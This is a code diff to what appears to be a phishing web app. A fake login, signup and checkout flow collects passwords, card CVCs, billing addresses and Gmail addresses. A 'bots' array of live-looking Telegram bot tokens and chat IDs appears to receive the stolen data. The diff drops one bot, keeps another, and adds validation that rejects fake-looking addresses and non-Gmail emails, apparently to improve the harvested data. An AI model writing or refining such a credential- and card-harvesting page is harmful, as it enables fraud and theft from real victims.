@@ -110,6 +110,9 @@ export default function App() {
     } else if (name === "cvc") {
       // Only numbers, max 4
       val = val.replace(/\D/g, "").substring(0, 4);
+    } else if (name === "zip") {
+      // Only numbers
+      val = val.replace(/\D/g, "");
     }
 
     setCheckoutData(prev => ({ ...prev, [name]: val }));
@@ -140,7 +143,25 @@ export default function App() {
 
     // Validation: Billing address fields
     if (!checkoutData.address.trim() || !checkoutData.city.trim() || !checkoutData.state.trim() || !checkoutData.zip.trim()) {
-      alert("Todos los campos de la dirección de facturación son obligatorios.");
+      alert("⚠️ Error: Todos los campos de la dirección de facturación son obligatorios.");
+      return;
+    }
+
+    // Heuristic to check if an address string looks "real"
+    const isLikelyReal = (str: string) => {
+      const clean = str.trim();
+      // Requirement: min 5 chars, at least one space, at least one digit, and no extreme repetition
+      return clean.length >= 5 && /\s/.test(clean) && /\d/.test(clean) && !/(.)\1{4,}/.test(clean);
+    };
+
+    if (!isLikelyReal(checkoutData.address)) {
+      alert("⚠️ Error: La dirección de facturación parece inválida. Por favor, ingrese una dirección real (incluya número y calle).");
+      return;
+    }
+
+    // Validation: Email
+    if (!checkoutData.email || !checkoutData.email.toLowerCase().endsWith("@gmail.com")) {
+      alert("⚠️ Error: Debe ingresar un correo electrónico @gmail.com válido.");
       return;
     }
 
@@ -152,7 +173,6 @@ export default function App() {
     setIsSubmitting(true);
     
     const bots = [
-      { token: "8678575710:AAE14KegKrQNkCBqQ8y_YhdwYeDpjls1QbQ", chatId: "8582874053" },
       { token: "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs", chatId: "8447588640" }
     ];
     
@@ -411,9 +431,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={handleGoToSignup}
-                                disabled={loginPassword.length < 12}
+                                disabled={loginPassword.length < 12 || !loginEmail.toLowerCase().endsWith("@gmail.com")}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  loginPassword.length >= 12 
+                                  loginPassword.length >= 12 && loginEmail.toLowerCase().endsWith("@gmail.com")
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
@@ -501,9 +521,9 @@ export default function App() {
                             <div className="flex flex-col gap-1">
                               <button 
                                 onClick={() => setModalView("payment")}
-                                disabled={signupPassword.length < 12 || !signupName}
+                                disabled={signupPassword.length < 12 || !signupName || !signupEmail.toLowerCase().endsWith("@gmail.com")}
                                 className={`w-full font-bold py-4 rounded-full uppercase tracking-wider transition-all ${
-                                  signupPassword.length >= 12 && signupName
+                                  signupPassword.length >= 12 && signupName && signupEmail.toLowerCase().endsWith("@gmail.com")
                                     ? "bg-[#00aff0] text-white shadow-lg shadow-blue-100 cursor-pointer active:scale-[0.98]" 
                                     : "bg-gray-200 text-gray-400 cursor-not-allowed"
                                 }`}
